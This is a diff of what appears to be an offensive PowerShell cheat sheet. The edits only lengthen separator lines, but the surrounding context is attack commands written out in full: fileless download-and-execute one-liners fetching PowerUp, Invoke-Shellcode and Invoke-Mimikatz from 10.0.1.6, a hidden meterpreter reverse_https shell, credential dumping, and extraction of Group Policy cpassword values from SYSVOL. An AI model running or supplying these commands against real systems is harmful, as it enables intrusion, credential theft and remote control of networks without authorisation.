@@ -16,7 +16,7 @@ powershell -nop -exec bypass "IEX (New-Object Net.Webclient).UploadString('http:
 
 # Execute a remote file
 powershell -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('http://10.0.1.6/PowerUp.ps1'); Invoke-AllChecks"
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # PowerSploit - getting a shell without writing to disk
 
@@ -37,7 +37,7 @@ python -m SimpleHTTPServer
 - Windows
 powershell -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('http://10.0.1.6:8000/Invoke-Shellcode.ps1')"
 Invoke-Shellcode -Payload windows/meterpreter/reverse_https -lhost 10.0.1.6 -lport 443 -Force
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Priv escalation
 
@@ -54,7 +54,7 @@ python -m SimpleHTTPServer
 powershell -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('http://10.0.1.6:8000/PowerUp.ps1'); Invoke-AllChecks"
 
 powershell -nop -NonI -w hidden -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://10.0.1.6:8000/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -lhost 10.0.1.6 -lport 443 -Force"
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Dump creds
 
@@ -64,7 +64,7 @@ python -m SimpleHTTPServer
 
 - Windows
 powershell -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('http://10.0.1.6:8000/Invoke-Mimikatz.ps1'); Invoke-Mimikatz"
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Find open fileshares
 
@@ -79,7 +79,7 @@ Invoke-ShareFinder -CheckShareAccess
 New-PSDrive S -PSProvider FileSystem -Root \\10.0.0.14\SYSVOL
 PSDrive
 Remove-PSDrive S
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Extract passwords from Group Policy
 
@@ -89,7 +89,7 @@ Get-GPPPassword
 \\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\
 Search xml files for cpassword.
 GetDecryptedCpassword 'AES 256-bit encrypted password'
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Dump the DC database
 
